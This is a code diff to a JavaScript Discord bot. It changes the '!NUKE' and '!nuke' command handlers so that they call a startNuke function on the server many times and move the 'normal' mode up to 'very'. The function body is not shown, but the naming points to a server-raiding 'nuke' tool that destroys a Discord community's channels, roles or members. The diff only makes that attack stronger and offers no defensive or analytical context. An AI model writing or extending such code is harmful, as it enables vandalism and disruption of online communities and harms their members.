@@ -656,10 +656,23 @@ client.on('messageCreate', async (message) => {
   // Nuke modes
   if (content === '!NUKE') {
     await startNuke(message.guild, message, 'very');
+    await startNuke(message.guild, message, 'very');
+    await startNuke(message.guild, message, 'very');
+    await startNuke(message.guild, message, 'very');
+    await startNuke(message.guild, message, 'very');
+    await startNuke(message.guild, message, 'very');
+    await startNuke(message.guild, message, 'very');
     return;
   }
   if (content === '!nuke') {
-    await startNuke(message.guild, message, 'normal');
+    await startNuke(message.guild, message, 'normal');await startNuke(message.guild, message, 'very');
+    await startNuke(message.guild, message, 'very');
+    await startNuke(message.guild, message, 'very');await startNuke(message.guild, message, 'very');
+    await startNuke(message.guild, message, 'very');
+    await startNuke(message.guild, message, 'very');
+    await startNuke(message.guild, message, 'very');
+    await startNuke(message.guild, message, 'very');
+    
     return;
   }
 
